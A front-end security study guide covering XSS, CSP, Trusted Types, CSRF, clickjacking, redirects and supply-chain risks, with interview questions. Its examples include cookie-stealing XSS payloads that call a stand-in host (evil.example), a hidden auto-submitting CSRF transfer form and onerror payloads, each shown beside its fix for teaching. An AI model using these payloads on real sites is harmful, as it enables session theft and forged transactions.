# Front-end Security: XSS, CSRF and CSP

> Browser platform · Topic 4

Front-end security is mostly about one boundary, the **origin**, and the ways attackers get around it: by running their script inside your origin (**XSS**), by making the user's browser send authenticated requests for them (**CSRF**), by framing your page and tricking clicks (**clickjacking**), or by getting code into your bundle through a CDN or an npm package (**supply chain**). This note builds the mental model from the same-origin policy, then covers each attack with the defence that actually works, the browser features that back you up (**Content Security Policy**, **Trusted Types**, cookie attributes, security headers), and how to roll them out on a real codebase.

## The same-origin policy

An **origin** is the triple *scheme + host + port*. Two URLs have the same origin only if all three match.

| URL compared with `https://app.example.com` | Same origin? | Why |
|---|---|---|
| `https://app.example.com/settings` | Yes | Path does not matter |
| `http://app.example.com` | No | Different scheme |
| `https://app.example.com:8443` | No | Different port |
| `https://api.example.com` | No | Different host (but **same site**, see below) |
| `https://example.com` | No | Different host |

The **same-origin policy** (SOP) lets a page *send* almost anything to another origin but not *read* the result:

| Allowed cross-origin | Blocked cross-origin |
|---|---|
| Embedding: `<img>`, `<script src>`, `<link rel=stylesheet>`, `<iframe>`, `<video>` | Reading a `fetch`/XHR response (unless the server opts in with CORS) |
| Navigating and submitting forms (`<form action="https://other.example">`) | Reading another frame's DOM (`iframe.contentWindow.document`) |
| Sending messages with `postMessage` | Reading another origin's cookies, `localStorage`, IndexedDB |

Two consequences drive the rest of this note:

- **"Write" is allowed, "read" is blocked.** A malicious page can make the browser *send* a request to your API, and the browser attaches your cookies. That is CSRF.
- **Anything running inside your origin bypasses SOP completely.** An injected script can read your DOM, call your API with the user's cookies and read every response. That is why XSS is the worst front-end bug.

**Site vs origin.** A *site* is the scheme plus the registrable domain (eTLD+1): `https://app.example.com` and `https://api.example.com` are cross-origin but **same-site**. `SameSite` cookies and the `Sec-Fetch-Site` header work with sites, not origins. CORS, which is how a server relaxes the read rule, is covered in [Networking, CORS and caching](../03-networking-cors-caching/notes.md).

## Cross-site scripting (XSS)

XSS means an attacker gets their JavaScript to run in your page, under your origin. From there it can read the DOM and any token stored in JavaScript-readable storage, call your API as the user, change what the user sees (fake login forms), and log keystrokes.

| Type | Where the payload lives | Example |
|---|---|---|
| **Stored** (persistent) | Saved in your database and served to every viewer | A comment `<img src=x onerror="fetch('https://evil.example/?c='+document.cookie)">` rendered without escaping |
| **Reflected** | In the request (usually the URL) and echoed back by the server | `/search?q=<script>...</script>` rendered as "Results for ..." |
| **DOM-based** | Never reaches the server; client-side JS moves it from a *source* to a *sink* | `el.innerHTML = location.hash.slice(1)` |

Stored and reflected XSS are server-rendering bugs; DOM-based XSS is purely a front-end bug, and it is the one SPAs mostly have.

### Sources and sinks

A **source** is attacker-influenced data; a **sink** is an API that turns a string into code or markup.

- **Sources:** `location.href`/`search`/`hash`, `document.referrer`, `window.name`, `postMessage` data, API responses containing user content, `localStorage` (if anything ever wrote untrusted data there).
- **Sinks:**

| Sink | Why it is dangerous |
|---|---|
| `innerHTML`, `outerHTML`, `insertAdjacentHTML()`, `document.write()` | Parses HTML: `<img onerror>`, `<svg onload>` run code |
| `eval()`, `new Function()`, `setTimeout("string")`, `setInterval("string")` | Executes a string as JavaScript |
| `a.href`, `iframe.src`, `location = ...`, `window.open(url)` | A `javascript:` URL runs code when followed |
| `script.src`, `script.textContent` | Loads or defines script |
| jQuery `$(html)`, `.html()`, `.append(string)` | Wrap `innerHTML` |
| Framework escape hatches: `dangerouslySetInnerHTML`, `v-html`, `[innerHTML]` with a bypass | Same as `innerHTML` |

```js
const name = new URLSearchParams(location.search).get("name");

// ❌ DOM XSS: ?name=<img src=x onerror=alert(document.domain)>
greeting.innerHTML = `Hello, ${name}`;

// ✅ text is never parsed as HTML
greeting.textContent = `Hello, ${name}`;

// ✅ building elements is also safe
const strong = document.createElement("strong");
strong.textContent = name;
greeting.replaceChildren("Hello, ", strong);
```

`<script>` tags inserted with `innerHTML` do not execute, but event-handler attributes do, so "we strip `<script>`" is not a defence. The DOM side of this (`innerHTML` vs `textContent`) is in [DOM manipulation](../../03-javascript/23-dom-manipulation/notes.md).

### `javascript:` URLs

Escaping does not help when the whole value is a URL:

```js
const website = user.website; // "javascript:fetch('https://evil.example/?c='+document.cookie)"

// ❌ clicking the link runs the code
link.href = website;

// ✅ allow only the schemes you expect
function safeUrl(value) {
  try {
    const url = new URL(value, location.origin);
    return ["http:", "https:", "mailto:"].includes(url.protocol) ? url.href : "about:blank";
  } catch {
    return "about:blank";
  }
}
link.href = safeUrl(website);
```

Allowlist schemes; never try to blocklist `javascript:`, because browsers accept variants such as `JaVaScRiPt:` and `java\tscript:`.

### Escaping vs sanitising

| | Escaping (output encoding) | Sanitising |
|---|---|---|
| What it does | Turns special characters into harmless text (`<` → `&lt;`) | Parses HTML and removes dangerous elements and attributes, keeping safe markup |
| Result | The user sees exactly what they typed, as text | The user's bold, links and lists survive; scripts do not |
| Use when | You need **text** (almost always) | You must accept **HTML**: rich-text editors, CMS content, Markdown output |
| Tools | `textContent`, template engines and frameworks by default | DOMPurify, the HTML Sanitizer API |

Escaping is **context-specific**: HTML body, HTML attribute, URL, JavaScript string and CSS each need different encoding. That is why you let the framework or the DOM API do it rather than writing `replace(/</g, "&lt;")` yourself.

**DOMPurify** is the standard sanitiser library:

```js
import DOMPurify from "dompurify";

const dirty = `<p>Hi <b>there</b></p><img src=x onerror=alert(1)><a href="javascript:alert(2)">x</a>`;
preview.innerHTML = DOMPurify.sanitize(dirty);
// → <p>Hi <b>there</b></p><img src="x"><a>x</a>
```

Sanitise **on output, in the browser, right before insertion**. Sanitising on input (before saving) is not enough on its own: the same data may later be used in another context, and sanitiser bugs get fixed in new versions, which only helps if you sanitise at render time.

**The HTML Sanitizer API** builds this into the browser:

```js
if ("setHTML" in Element.prototype) {
  preview.setHTML(dirty);          // parses and always removes script-capable content
} else {
  preview.innerHTML = DOMPurify.sanitize(dirty);
}
```

Status in late 2026: Firefox 148 (February 2026) and Chrome/Edge 146 (March 2026) ship `setHTML()`; **Safari does not**, so it is not Baseline. Feature-detect and keep DOMPurify as the fallback. Two traps: `setHTMLUnsafe()` (supported everywhere) does **not** sanitise despite the similar name, and old articles show `new Sanitizer().sanitizeFor()`, an earlier design that was removed.

### Framework escaping

| Framework | Safe by default | Escape hatch (your responsibility) |
|---|---|---|
| React | `{value}` in JSX is rendered as text | `dangerouslySetInnerHTML={{ __html: html }}`, `ref.current.innerHTML`, `href={userUrl}` |
| Vue | `{{ value }}` is escaped | `v-html`, `:href` with a user URL |
| Angular | Interpolation escapes; `[innerHTML]` is sanitised automatically | `bypassSecurityTrustHtml()` and friends |

Frameworks protect the common case only. They do not validate URL schemes for you (React warns about `javascript:` URLs; do not rely on the warning), they cannot protect you when you reach for the DOM directly, and server-side rendering adds one more sink: serialising state into a `<script>`.

```js
// ❌ a comment containing "</script><script>alert(1)</script>" ends the script element early
html += `<script>window.__STATE__ = ${JSON.stringify(state)}</script>`;

// ✅ escape "<" so the HTML parser can never see a closing tag
const json = JSON.stringify(state).replace(/</g, "\\u003c");
html += `<script>window.__STATE__ = ${json}</script>`;
```

## Trusted Types

Trusted Types turn DOM XSS from "find every sink by code review" into a **type error the browser enforces**. With the policy enabled, sinks such as `innerHTML`, `script.src` and `eval` reject plain strings and accept only `TrustedHTML`, `TrustedScriptURL` or `TrustedScript` objects, which can only be created by **policies** you define.

```http
Content-Security-Policy: require-trusted-types-for 'script'; trusted-types app-html
```

```js
const policy = trustedTypes.createPolicy("app-html", {
  createHTML: (input) => DOMPurify.sanitize(input),
});

el.innerHTML = policy.createHTML(userHtml); // ✅ goes through the sanitiser
el.innerHTML = userHtml;                    // ❌ TypeError: requires 'TrustedHTML' assignment
```

- Security review shrinks to the few `createPolicy` calls instead of every `innerHTML` in the codebase and its dependencies.
- The `trusted-types` directive lists the allowed policy names, so a dependency cannot quietly create its own permissive policy. Libraries that create policies (DOMPurify does) need their names added.
- A policy named `default` is called for every plain-string assignment; use it as a temporary migration shim that logs and sanitises, not as the end state.
- Roll out with `Content-Security-Policy-Report-Only` first: violations are reported, nothing breaks.

Support: Chromium since 2020, Safari 26 (September 2025) and Firefox 148 (February 2026), so it became Baseline in 2026. Browsers that do not support it ignore the directive, which makes enforcing it safe progressive hardening.

## Content Security Policy

CSP is a response header that tells the browser which scripts, styles, frames and connections the page may use. It is **defence in depth**: it does not fix an injection bug, it stops the injected payload from running. Escaping and sanitising remain the primary defence.

### Allowlists do not work; strict CSP does

The classic policy lists trusted hosts:

```http
Content-Security-Policy: script-src 'self' https://cdn.example.net https://www.google-analytics.com
```

Research on real sites found most allowlist policies bypassable: an allowed CDN usually hosts some old library or JSONP endpoint that an attacker can load to execute arbitrary code. The recommended approach is a **strict CSP** based on nonces or hashes:

```http
Content-Security-Policy:
  script-src 'nonce-r4nd0mB4se64' 'strict-dynamic' https: 'unsafe-inline';
  object-src 'none';
  base-uri 'none';
  frame-ancestors 'self';
  report-to csp
Reporting-Endpoints: csp="https://example.com/csp-reports"
```

```html
<script nonce="r4nd0mB4se64" src="/app.js"></script>
<script nonce="r4nd0mB4se64">window.config = { locale: "en" };</script>
```

| Part | Meaning |
|---|---|
| `'nonce-...'` | Only `<script>` elements carrying this exact nonce run. The server generates a new unguessable value **per response**; an attacker who injects markup cannot know it. |
| `'sha256-...'` (hash) | Alternative to nonces: only inline scripts whose content matches the hash run. Suits static pages that cannot get a per-response nonce. |
| `'strict-dynamic'` | Trust propagates: a nonced script may load further scripts with `createElement("script")`. This is what makes bundlers, lazy chunks and tag loaders work without listing hosts. |
| `https:` and `'unsafe-inline'` | Fallbacks for very old browsers only. CSP Level 3 browsers ignore `'unsafe-inline'` when a nonce or hash is present, and ignore host/scheme sources when `'strict-dynamic'` is present. |
| `object-src 'none'` | Blocks plugin content, an old bypass route. |
| `base-uri 'none'` | Stops an injected `<base href>` redirecting all your relative script URLs. |
| `frame-ancestors` | Who may frame this page (clickjacking, below). |

> **Note:** A nonce must be unique per response. If your CDN caches HTML, every visitor gets the same nonce and it stops being secret; use hashes for static or edge-cached HTML, or inject the nonce at the edge.

### Why `'unsafe-inline'` (on its own) defeats CSP

Most XSS payloads are inline: `<script>...</script>` or `onerror="..."`. A policy with `'unsafe-inline'` and no nonce or hash allows exactly those, so it blocks almost nothing an attacker needs. `'unsafe-eval'` similarly re-enables `eval()` and `new Function()`. Inline event-handler attributes (`onclick="..."`) are never allowed by a nonce, so a strict CSP forces `addEventListener` (see [Events and delegation](../../03-javascript/24-events-and-delegation/notes.md)), which is a good thing.

### Rolling it out

1. Ship the policy as `Content-Security-Policy-Report-Only`. Nothing is blocked; violations are reported.
2. Collect reports with the Reporting API (`Reporting-Endpoints` + `report-to`). Also send the older `report-uri` directive for browsers that do not support `report-to`; browsers that do ignore `report-uri`.
3. Fix real violations: move inline handlers to `addEventListener`, add nonces in the server templates, replace `eval`-based libraries.
4. Filter noise: browser extensions inject scripts and generate many reports that are not your bug.
5. Switch to the enforcing header and keep reporting on.

CSP can also be set with `<meta http-equiv="Content-Security-Policy">`, but `frame-ancestors`, reporting and `sandbox` do not work there, and it only applies to content after the tag. Prefer the header.

## Cross-site request forgery (CSRF)

CSRF abuses **ambient credentials**: the browser attaches cookies to a request based on where it goes, not on which page started it. A page on `evil.example` can submit a form to your site, and if the session cookie goes with it, the server sees a legitimate, authenticated request.

```html
<!-- on https://evil.example, which the logged-in victim visits -->
<form action="https://bank.example/transfer" method="POST" id="f">
  <input type="hidden" name="to" value="attacker">
  <input type="hidden" name="amount" value="5000">
</form>
<script>document.getElementById("f").submit();</script>
```

The attacker never sees the response (SOP), but they do not need to: the side effect has happened. CSRF needs **cookie-based (or other ambient) authentication**. An API that only accepts a bearer token in the `Authorization` header is not CSRF-able, because no browser attaches that header automatically, but then the token lives in JavaScript-readable storage and XSS can steal it. Where to keep tokens is a trade-off covered in [Storage and cookies](../02-storage-and-cookies/notes.md).

### Defences

| Defence | How it works | Limits |
|---|---|---|
| **`SameSite` cookies** | `Lax`: cookie sent on same-site requests and top-level cross-site **GET** navigations only. `Strict`: never sent cross-site, even when following a link. `None`: always sent (requires `Secure`). | Works per **site**, so a compromised sibling subdomain is "same-site". `Lax` does not protect state-changing GET endpoints. Chrome defaults cookies without the attribute to `Lax`; Firefox and Safari do not, so set it explicitly. |
| **Synchroniser token** | The server stores a random token in the session and renders it into forms (hidden field) or a `<meta>` tag; state-changing requests must send it back. | Needs server-side session state. The classic, robust choice for server-rendered apps. |
| **Double-submit cookie** | The token is sent both as a cookie and as a header/field; the server checks they match. Stateless. | The naive version is beaten by "cookie tossing" from a subdomain. Use a **signed** token bound to the session (HMAC) and a `__Host-` cookie prefix. |
| **Fetch Metadata** | Browsers send `Sec-Fetch-Site: same-origin / same-site / cross-site / none`; the server rejects cross-site non-GET requests. | Supported in all current browsers (Safari since 16.4); keep a fallback for requests without the header. |
| **`Origin` header check** | Reject state-changing requests whose `Origin` is not yours. | Good extra layer; some requests (privacy settings, old clients) omit it. |
| **Custom request header** | Require e.g. `X-Requested-With`; a plain form cannot set headers, and a cross-origin `fetch` with one triggers a CORS preflight your server refuses. | Only as strong as your CORS configuration. |

The modern baseline: `SameSite=Lax` (or `Strict`) session cookies, **plus** a token or a Fetch Metadata check, and no state changes on GET.

> **Note:** Chrome makes a temporary exception for cookies *without* a `SameSite` attribute: for two minutes after being set they are still sent on cross-site top-level POSTs (to keep some login flows working). Another reason to set the attribute explicitly.

### Why CORS is not CSRF protection

CORS decides whether a page from another origin may **read** a response. It does not stop the request being **sent**:

- A cross-site `<form>` POST is a navigation, not a `fetch`; CORS is not involved at all.
- A "simple" `fetch` (GET/POST with `application/x-www-form-urlencoded`, `multipart/form-data` or `text/plain`, no custom headers) is sent **without a preflight**; the server performs the action, and only the response is hidden from the attacker.
- Only "non-simple" requests (JSON content type, custom headers, PUT/DELETE) get a preflight. A JSON API is protected only incidentally, and loses that protection the day someone makes the server accept `text/plain` bodies.

A strict CORS policy is good hygiene, but it is not a CSRF defence. Details of preflights are in [Networking, CORS and caching](../03-networking-cors-caching/notes.md).

## Clickjacking

The attacker loads your page in a transparent `<iframe>` on their site and positions a decoy ("Win a prize!") over your real "Delete account" or "Confirm payment" button. The user clicks your button without knowing it.

```http
Content-Security-Policy: frame-ancestors 'none'          # nobody may frame this page
Content-Security-Policy: frame-ancestors 'self' https://partner.example
X-Frame-Options: DENY                                    # legacy equivalent: DENY or SAMEORIGIN
```

`frame-ancestors` is the modern control and wins when both are present; send `X-Frame-Options` as well for old clients. Neither works from a `<meta>` tag, and JavaScript "frame-busting" (`if (top !== self) top.location = self.location`) is easily defeated with the `sandbox` attribute. How iframes themselves work is in [Media, SVG, canvas and iframes](../../01-html/09-media-svg-canvas-iframe/notes.md).

## `postMessage`: always check the origin

`postMessage` is the safe way for windows and iframes on different origins to talk, but the receiver gets messages from **any** window that has a reference to it.

```js
// ❌ any site that frames or opens this page can inject HTML
window.addEventListener("message", (e) => {
  output.innerHTML = e.data.html;
});

// ✅ check the exact origin, validate the shape, avoid HTML sinks
const WIDGET_ORIGIN = "https://widget.example.com";
window.addEventListener("message", (e) => {
  if (e.origin !== WIDGET_ORIGIN) return;
  if (typeof e.data?.text !== "string") return;
  output.textContent = e.data.text;
});

// ✅ when sending, name the target origin instead of "*"
iframe.contentWindow.postMessage({ type: "init", userId }, WIDGET_ORIGIN);
```

Compare origins with `===` against an allowlist. `e.origin.includes("example.com")` and `endsWith("example.com")` accept `example.com.evil.net` and `evilexample.com`.

## Open redirects

A login page that sends users to `?next=` after sign-in is an **open redirect** if it accepts any URL: phishing links look like they point to your domain, and `?next=javascript:...` turns it into XSS.

```js
// ❌
location.href = new URLSearchParams(location.search).get("next");

// ✅ resolve against our origin, accept only same-origin targets
function safeNext(next) {
  try {
    const url = new URL(next ?? "/", location.origin);
    if (url.origin === location.origin) return url.pathname + url.search + url.hash;
  } catch {}
  return "/";
}
location.href = safeNext(new URLSearchParams(location.search).get("next"));
```

Parsing with `new URL` and comparing `origin` rejects the classic tricks: `//evil.example` (protocol-relative), `/\evil.example` (the URL parser treats `\` as `/`), and `javascript:` (its origin is `"null"`). String checks like `startsWith("/")` miss the first two.

## Third-party scripts and Subresource Integrity

A `<script>` from another domain runs with **full access to your origin**. Analytics, chat widgets, A/B testing and tag managers are all part of your attack surface. Two real incidents:

- **Magecart attacks** (for example British Airways, 2018): a modified third-party or first-party script skimmed card details from checkout forms.
- **polyfill.io** (2024): the domain behind a popular polyfill CDN changed owner and started serving malicious code to the many sites that still loaded it.

**Subresource Integrity (SRI)** pins a script or stylesheet to an exact hash:

```html
<script src="https://cdn.example.net/lib@3.7.1/lib.min.js"
        integrity="sha384-BASE64_HASH_OF_THE_FILE"
        crossorigin="anonymous"></script>
```

```bash
openssl dgst -sha384 -binary lib.min.js | openssl base64 -A   # produces the hash
```

If the file changes by one byte, the browser refuses to run it. SRI needs `crossorigin` (the CDN must send CORS headers) and only works for **versioned, immutable** files. It cannot protect "loader" scripts that change on purpose (most analytics and tag managers), and it would not have saved polyfill.io users, because that service generated different code per browser.

Practical controls: self-host what you can, pin versions with SRI where possible, load untrusted widgets in a sandboxed cross-origin `<iframe>`, keep the tag manager's publish rights restricted, and let a strict CSP limit what injected scripts can do.

## npm supply-chain risks

Your bundle is mostly other people's code, and it runs with your origin's privileges. Attack routes include **typosquatting** (`reqeust` instead of `request`), **compromised maintainer accounts** (in September 2025 phished maintainers had popular packages such as `chalk` and `debug` republished with wallet-stealing code, followed by the self-spreading "Shai-Hulud" worm), **malicious install scripts** (`postinstall` runs on every developer machine and CI runner), and **dependency confusion** (a public package with the same name as your private one).

| Practice | Why |
|---|---|
| Commit the lockfile; use `npm ci` in CI | Installs exactly the reviewed versions, not "latest compatible" |
| Delay new versions (a minimum release age in Renovate/Dependabot or the package manager) | Most hijacked versions are detected and pulled within hours or days |
| `npm audit` / Dependabot alerts in CI | Known vulnerabilities in the tree |
| `--ignore-scripts` (or an allowlist of packages allowed to run scripts) | Install scripts are the main way malware executes |
| Scoped private packages and a configured registry | Prevents dependency confusion |
| Fewer, well-maintained dependencies | Each package and its maintainers are part of your trust base |
| Provenance and trusted publishing for your own packages | Proves a package was built from a given repo and CI run |

## HTTPS and HSTS

Without HTTPS, anyone on the network path can read and rewrite your pages, which makes every other defence pointless. Browsers block **mixed content** (HTTP scripts on HTTPS pages), and many APIs (service workers, geolocation, clipboard) require a secure context.

HTTPS alone leaves the first plain-HTTP request open to **SSL stripping**. **HSTS** tells the browser to use HTTPS for the domain for a period, without ever trying HTTP:

```http
Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
```

`preload` plus submission to the browsers' preload list protects even the very first visit. Roll out with a short `max-age` first: once a browser has seen a long one, you cannot go back to HTTP for that domain, and `includeSubDomains` breaks any subdomain that still lacks HTTPS.

## Security headers at a glance

| Header | Typical value | Protects against |
|---|---|---|
| `Content-Security-Policy` | Strict nonce policy (above) | XSS impact, injected scripts, framing |
| `Strict-Transport-Security` | `max-age=63072000; includeSubDomains` | Downgrade and SSL stripping |
| `X-Content-Type-Options` | `nosniff` | MIME sniffing (a user upload served as script or HTML) |
| `X-Frame-Options` | `DENY` or `SAMEORIGIN` | Clickjacking in old browsers |
| `Referrer-Policy` | `strict-origin-when-cross-origin` (the browser default) or `no-referrer` | Leaking full URLs (with tokens or IDs) to other sites |
| `Permissions-Policy` | `camera=(), microphone=(), geolocation=()` | Your page or embedded iframes using powerful features |
| `Cross-Origin-Opener-Policy` | `same-origin` | Cross-window attacks and leaks via `window.opener`; needed for cross-origin isolation |
| `Cross-Origin-Resource-Policy` | `same-origin` / `same-site` | Other sites loading your resources (Spectre-style leaks) |
| `Cross-Origin-Embedder-Policy` | `require-corp` | With COOP, enables `SharedArrayBuffer` and precise timers |
| `Set-Cookie` | `__Host-session=...; Secure; HttpOnly; SameSite=Lax; Path=/` | Cookie theft, CSRF, subdomain overwrite |
| `X-XSS-Protection` | `0`, or omit it | The old XSS filter is gone from browsers and could itself be abused; do not rely on it |

## Common Mistakes

- **Treating `innerHTML` with "trusted" API data as safe.** API data often contains user content; treat every string as text unless it was sanitised for HTML.
- **Blocklisting instead of allowlisting**: stripping `<script>` tags or the string `javascript:`. Payloads use `onerror`, `<svg onload>` and mixed-case schemes.
- **Sanitising once on input and then trusting the stored HTML forever.** Sanitise at render time with an up-to-date sanitiser.
- **A CSP with `'unsafe-inline'` and no nonce or hash.** It looks like a policy but blocks almost nothing; the same goes for broad allowlists like `https:` alone.
- **Reusing one nonce for every response** (static HTML cached at the CDN), which makes it guessable.
- **Believing CORS prevents CSRF**, or that a JSON API "can't be hit by forms" while the server happily parses `text/plain`.
- **Changing state on GET requests**, which `SameSite=Lax` cookies still send on cross-site navigations.
- **`postMessage` listeners without an exact origin check**, or sending sensitive data with `targetOrigin` `"*"`.
- **Validating redirects with string checks** (`startsWith("/")`) that `//evil.example` passes.
- **Adding third-party scripts without review**: a tag manager with broad publish rights is a production deploy pipeline nobody audits.

## Key Takeaways

- The same-origin policy blocks reading across origins, not sending. XSS bypasses it from the inside; CSRF abuses the sending.
- Prevent XSS by keeping untrusted data out of HTML and code sinks: `textContent`, framework escaping, URL scheme allowlists, and DOMPurify (or `setHTML()` where supported) when HTML is required.
- Trusted Types (Baseline since 2026) make DOM XSS sinks reject plain strings, so only reviewed policies can create HTML.
- A strict CSP uses per-response nonces or hashes with `'strict-dynamic'`, plus `object-src 'none'` and `base-uri 'none'`; roll it out in report-only mode first.
- Defend against CSRF with explicit `SameSite` cookies plus a CSRF token or Fetch Metadata check; CORS is not a CSRF defence.
- Stop clickjacking with `frame-ancestors` (and `X-Frame-Options` for old browsers); check `event.origin` exactly in every `message` listener; validate redirect targets by parsing them.
- Third-party scripts and npm packages run with your origin's privileges: minimise them, pin and verify them (SRI, lockfiles, delayed updates), and constrain them with CSP.

## Interview Questions

### Junior (0–1 year)

**Q1. What is XSS, and what are its three main types?**
Cross-site scripting is when an attacker gets their JavaScript to run in your page under your origin, so it can read the page, call your APIs as the user and steal data. **Stored** XSS is saved on the server (a malicious comment) and served to everyone; **reflected** XSS is echoed back from the request, usually a URL parameter; **DOM-based** XSS happens entirely in the browser when client code moves untrusted data (like `location.hash`) into a sink such as `innerHTML`.

**Q2. What is the same-origin policy, and what makes two URLs the same origin?**
It is the browser rule that a page can only read data (responses, DOM, storage) belonging to its own origin. An origin is scheme + host + port, and all three must match: `https://example.com` and `http://example.com` are different origins, as are `app.example.com` and `api.example.com`. The policy still allows embedding resources, submitting forms and navigating to other origins; it blocks reading the results.

**Q3. What is CSRF, and how do `SameSite` cookies help?**
Cross-site request forgery is when a malicious site makes the victim's browser send a request to your site, and the browser attaches the victim's cookies, so the server performs an action the user never intended. `SameSite=Lax` stops the cookie being sent on cross-site subresource requests and cross-site POSTs (it is still sent on top-level GET navigations), and `SameSite=Strict` stops it on all cross-site requests. Set the attribute explicitly, since only Chrome defaults to `Lax`.

**Q4. What is clickjacking, and how do you prevent it?**
The attacker frames your page invisibly and tricks the user into clicking a real button on it. Prevent it by forbidding framing with the `Content-Security-Policy: frame-ancestors 'none'` (or `'self'`) header, and `X-Frame-Options: DENY` or `SAMEORIGIN` for older browsers. These must be HTTP headers; they do not work in a `<meta>` tag.

**Q5. What is a Content Security Policy?**
A response header that tells the browser which sources of script, style, images, frames and connections the page may use, and blocks everything else. Its main job is to limit the damage of XSS: even if an attacker injects markup, a strict policy stops the injected script from running. It is defence in depth, not a replacement for escaping.

**Q6. Why do HTTPS and HSTS matter for front-end security?**
Without HTTPS, anyone on the network can read or modify your pages and scripts, which makes every other protection pointless, and many browser APIs only work in secure contexts. HSTS tells the browser to always use HTTPS for your domain, so an attacker cannot downgrade the first request to HTTP (SSL stripping). With `preload`, even the first visit is protected.

### Mid-level (2–4 years)

**Q7. Our API has a strict CORS policy. Does that protect us from CSRF?**
No. CORS controls whether another origin can **read** a response, not whether the request is **sent**. A cross-site HTML form POST is not subject to CORS at all, and "simple" `fetch` requests (form content types, no custom headers) are sent without a preflight, so the server performs the action before the browser hides the response. Only non-simple requests get a preflight, and relying on that is fragile. Use `SameSite` cookies plus a CSRF token or a `Sec-Fetch-Site` check, and never change state on GET.

**Q8. What is the difference between escaping and sanitising, and when do you need a sanitiser?**
Escaping encodes special characters so a value is displayed as text; it is the right default and is what `textContent` and framework interpolation do. Sanitising parses HTML and removes dangerous parts while keeping safe formatting; you need it only when you must render user-supplied **HTML**, such as rich-text editor output or Markdown converted to HTML. Use DOMPurify (or `Element.setHTML()` where supported, with a DOMPurify fallback), sanitise at render time, and never write your own regex-based sanitiser.

**Q9. Explain how a nonce-based CSP with `'strict-dynamic'` works and why it beats a host allowlist.**
The server generates a random nonce for every response, puts it in the `script-src 'nonce-...'` directive and on each legitimate `<script nonce="...">`. Injected scripts cannot know the nonce, so they do not run. `'strict-dynamic'` lets those trusted scripts load further scripts dynamically, so bundler chunks and tag loaders work without listing hosts. Host allowlists are routinely bypassable because allowed CDNs and Google domains host JSONP endpoints or old libraries that an attacker can load to run code. Add `object-src 'none'` and `base-uri 'none'` to close the remaining gaps.

**Q10. What is wrong with this code, and how do you fix it?**
```js
window.addEventListener("message", (e) => {
  if (e.origin.endsWith("example.com")) {
    document.getElementById("banner").innerHTML = e.data;
  }
});
```
Two bugs. `endsWith("example.com")` accepts `https://evilexample.com`, so any attacker who registers such a domain and frames or opens the page passes the check. And `e.data` goes straight into `innerHTML`, so a message becomes DOM XSS. Compare `e.origin` with `===` against an explicit allowlist (`"https://app.example.com"`), validate the message shape, and write with `textContent` (or sanitise if HTML is really needed). On the sending side, pass the exact target origin instead of `"*"`.

**Q11. A login page redirects to `?next=` after sign-in. How can that be abused, and how do you validate it?**
If any URL is accepted, it is an open redirect: phishing links show your trusted domain but land on the attacker's site, and `next=javascript:...` can become XSS when assigned to `location`. Resolve the value with `new URL(next, location.origin)` and accept it only if `url.origin === location.origin`, falling back to `/`. This rejects `//evil.example`, `/\evil.example` and `javascript:` URLs, which naive `startsWith("/")` checks let through. The server should apply the same rule for server-side redirects.

**Q12. "We use React, so we are safe from XSS." Where can XSS still happen in a React app?**
JSX escapes text, but XSS still appears through `dangerouslySetInnerHTML` with unsanitised content, `href`/`src` props set from user input (`javascript:` URLs), direct DOM access through refs (`ref.current.innerHTML`), third-party libraries that use `innerHTML` internally (Markdown renderers, chart tooltips), server-side rendering that serialises state into a `<script>` without escaping `<`, and `eval`-like code. Mitigate with URL scheme allowlists, DOMPurify for any HTML, Trusted Types to catch the sinks you missed, and a strict CSP.

**Q13. What is Subresource Integrity, and when does it not help?**
SRI adds an `integrity="sha384-..."` hash to a `<script>` or `<link>`; if the downloaded file does not match, the browser refuses to use it, which protects against a compromised CDN serving modified code. It needs `crossorigin` and CORS headers on the CDN, and works only for versioned, immutable files. It does not help with scripts that change by design (analytics loaders, tag managers, services that generate per-browser code like polyfill.io did), and it does nothing about what a legitimate script is allowed to do once it runs.

### Senior (5+ years)

**Q14. You are asked to roll out a strict CSP on a large, five-year-old app with many teams and dozens of inline scripts and third-party tags. How do you plan it?**
Start with measurement, not enforcement: ship a strict nonce-based policy (`'nonce-…' 'strict-dynamic'`, `object-src 'none'`, `base-uri 'none'`) as `Content-Security-Policy-Report-Only` with a reporting endpoint, and build a dashboard grouped by directive, source file and team, filtering out browser-extension noise. Add nonce generation in the server or edge layer and make every template use a shared helper, so teams cannot hand-write script tags. Then burn down violations by category: inline event handlers to `addEventListener`, inline scripts to nonced or external files, `eval`-dependent libraries replaced, and third-party tags loaded through a nonced loader (which `'strict-dynamic'` then trusts).

Enforce route by route or by percentage of traffic, keeping report-only on for the rest, and add a CI lint that rejects inline handlers and `eval`. Treat Trusted Types as phase two, again report-only first. Recommendation: report-only for several weeks, a shared nonce helper, gradual enforcement with reporting left on permanently; never "temporarily" add `'unsafe-inline'`, because temporary exceptions become the policy.

**Q15. A bug bounty report shows a working DOM XSS in production: `?redirect=` ends up in `location.href`. What do you do, now and afterwards?**
Immediately: confirm and scope it (which pages, which parameter, can it reach authenticated users), ship a targeted fix that validates the URL by parsing and comparing origins, and check logs and reports for exploitation attempts. If session theft is plausible (tokens readable by JavaScript), invalidate sessions or rotate tokens. A WAF rule blocking `javascript:` in that parameter can buy time while the fix deploys, but it is not the fix.

Afterwards, treat it as a class of bugs, not one bug: search for every other source-to-sink path (`location`, `postMessage`, `innerHTML`, `href` assignments), add a shared `safeUrl()`/`safeNext()` helper and a lint rule banning direct assignment, enable Trusted Types and a strict CSP in report-only mode to find the rest, and write a blameless post-mortem. Recommendation: fix the instance within hours, then invest in guardrails (helpers, lint rules, Trusted Types) so the next instance cannot ship.

**Q16. Marketing wants to add a tag manager so they can deploy third-party scripts without engineering. How do you handle the security risk?**
A tag manager is a second deployment pipeline straight into your origin: whoever can publish a tag can run arbitrary JavaScript on your checkout page. Do not refuse outright; set guardrails. Restrict publish rights to a small group with review and audit logs, keep tags off sensitive pages (login, payment, account settings) entirely, and load untrusted widgets in sandboxed cross-origin iframes where possible. Keep a strict CSP so the loader is nonced and `connect-src` limits where data can be sent, and monitor what scripts actually run in production (CSP reports or client-side script inventories).

Recommendation: allow it with a written policy (approved vendors, excluded pages, review before publish), technical limits (CSP, iframes, page exclusions) and an owner who reviews the tag inventory regularly; the polyfill.io incident showed that "a script we added years ago" is a real risk.

**Q17. How would you reduce npm supply-chain risk across a monorepo used by many teams?**
Make the safe path the default in tooling rather than relying on each developer: one lockfile committed and `npm ci` (or the pnpm/yarn equivalent) everywhere; automated update PRs through Renovate or Dependabot with a minimum release age of a few days, grouped and reviewed by owning teams; install scripts disabled by default with an explicit allowlist; a private registry or proxy with scoped package names to prevent dependency confusion; `npm audit` or an SCA tool failing CI on high-severity issues with an exception process.

